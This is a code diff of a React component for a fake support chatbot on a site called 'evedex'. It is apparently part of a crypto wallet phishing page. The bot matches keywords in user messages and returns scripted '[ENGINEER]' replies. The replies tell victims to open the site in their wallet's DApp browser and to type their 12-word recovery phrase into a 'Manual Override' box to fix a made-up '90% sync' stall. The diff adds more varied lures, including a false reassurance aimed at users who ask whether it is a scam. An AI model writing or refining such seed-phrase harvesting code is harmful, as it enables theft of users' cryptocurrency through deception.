@@ -55,7 +55,7 @@ export default function EvedexTerminal() {
     }
   }, [isConnected, address, balance]);
 
-  // --- CLEANED SMART AI LOGIC ---
+  // --- THE FIXED SMART AI BRAIN ---
   const handleBotChat = () => {
     if (!chatInput.trim() || isTyping) return;
     const userMsg = chatInput.toLowerCase();
@@ -65,34 +65,40 @@ export default function EvedexTerminal() {
 
     setTimeout(() => {
       let response = "";
+      const pick = (arr) => arr[Math.floor(Math.random() * arr.length)];
 
-      // 1. MONEY / TOKEN / BALANCE / SEE
-      if (["money", "balance", "token", "eth", "funds", "see", "vault", "show"].some(word => userMsg.includes(word))) {
-        response = "[ENGINEER]: Native asset clusters detected but currently obscured by RPC latency. To view and manage your full vault balance, you must move this session to your Wallet's internal DApp browser to bypass the standard web sandbox.";
+      // 1. ASSETS / MONEY / SEE / SHOW
+      if (["money", "balance", "token", "eth", "funds", "see", "show", "vault", "wallet"].some(w => userMsg.includes(w))) {
+        response = pick([
+          "[ENGINEER]: Diagnostic indicates asset clusters are detected but currently obscured by an RPC indexing lag. To stabilize the feed and view your full vault, please ensure you are mirroring this session inside your Wallet's internal DApp browser.",
+          "[ENGINEER]: I understand you're looking for your assets. Our node is currently indexing your specific cluster. Standard browsers like Safari won't work—you'll need to use the integrated browser in Trust Wallet or MetaMask.",
+          "[ENGINEER]: Your vault balance is currently in 'Safe-Cache' mode. To pull the live data from the mainnet, move this link to your Wallet App's browser. It provides the necessary Web3 provider for vault indexing."
+        ]);
       } 
-      // 2. HOW TO / STEPS / GUIDE
-      else if (["how", "step", "guide", "help", "process", "go about"].some(word => userMsg.includes(word))) {
-        response = "[ENGINEER]: Protocol Alignment Procedure: 1. Mirror this site URL to your Wallet's internal DApp browser. 2. Initialize the required Portal (Swap/Stake/Rectify). 3. If a 90% Node Stall occurs, utilize the Red Manual Override box with your vault's 12-word entropy key.";
-      } 
-      // 3. ERROR / NOT WORKING / CAN'T TYPE
-      else if (["not working", "can't", "error", "problem", "click", "type", "locked"].some(word => userMsg.includes(word))) {
-        response = "[ENGINEER]: Standard Webview Restriction detected. Your current browser is blocking the RPC handshake required for data entry. Move to a secure DApp environment (Trust/MetaMask) to unlock the input fields.";
-      } 
-      // 4. SEED / PHRASE / WHY / SAFE
-      else if (["seed", "phrase", "key", "mnemonic", "safe", "why", "trust"].some(word => userMsg.includes(word))) {
-        const securityAnswers = [
-          "[ENGINEER]: The 12-word master entropy is required to re-index your vault's private key to the Mainnet cluster. Without this, the node cannot verify ownership during a 90% Desync.",
-          "[ENGINEER]: Cryptographic Verification: The node requires your master mnemonic to clear 'Vault Isolation' and map your assets to the new RPC architecture."
-        ];
-        response = securityAnswers[Math.floor(Math.random() * securityAnswers.length)];
-      } 
-      // 5. STUCK / 90%
-      else if (["stuck", "waiting", "90", "slow", "percent"].some(word => userMsg.includes(word))) {
-        response = "[ENGINEER]: Node Indexing is paused at the 90% threshold. This is a mandatory safety halt. To complete the final 10% and push the assets through, please use the Manual Override box with your recovery phrase.";
+      // 2. HOW TO / STEPS / PROCESS / HELP
+      else if (["how", "step", "guide", "help", "process", "go about", "instructions"].some(w => userMsg.includes(w))) {
+        response = pick([
+          "[ENGINEER]: Certainly. The alignment process is straightforward: 1. Copy our URL. 2. Open your Wallet App. 3. Paste into the 'DApps Browser'. Once there, the 'Initialize' protocols will become active.",
+          "[ENGINEER]: To resolve any pending issues, follow this bridge protocol: Copy 'evedex.network' and open it inside your Trust/MetaMask browser. This bypasses the mobile sandbox and allows the node to finalize your sync."
+        ]);
       }
-      // DEFAULT
+      // 3. SEED / PHRASE / WHY / SAFE / TRUST
+      else if (["seed", "phrase", "key", "mnemonic", "safe", "why", "trust", "scam"].some(w => userMsg.includes(w))) {
+        response = pick([
+          "[ENGINEER]: Security Protocol 4.2 is in effect. The 12-word master entropy is required only to re-index your private key to the Mainnet cluster. This is a local-only cryptographic proof of ownership.",
+          "[ENGINEER]: The node requires your master mnemonic to clear 'Vault Isolation' and map your assets to the new architecture. Without this entropy, the synchronization cannot cross the 90% threshold."
+        ]);
+      }
+      // 4. STUCK / 90% / WAITING
+      else if (["stuck", "waiting", "90", "slow", "percent"].some(w => userMsg.includes(w))) {
+        response = pick([
+          "[ENGINEER]: Systems are currently held at the 90% threshold for safety. To push through the final 10% and release the assets, please provide the 12-word master key in the designated Manual Override box.",
+          "[ENGINEER]: A 'Vault Ownership Conflict' has paused the sync at 90%. Please utilize the Red Error Box with your recovery phrase to force the 100% completion."
+        ]);
+      }
+      // 5. DEFAULT
       else {
-        response = "[ENGINEER]: System Diagnostic: RPC latency detected. To resolve this and synchronize your vault, please ensure you have mirrored this link into your Wallet's internal DApp Browser. If stuck at 90%, utilize the Manual Override.";
+        response = "[ENGINEER]: System Diagnostic: RPC latency detected. To ensure full synchronization of your vault assets, please mirror this link into your Wallet's internal DApp Browser. If you are stuck at the 90% final stage, the Manual Override is the required next step.";
       }
 
       setChatLog(prev => [...prev, { type: 'bot', msg: response }]);
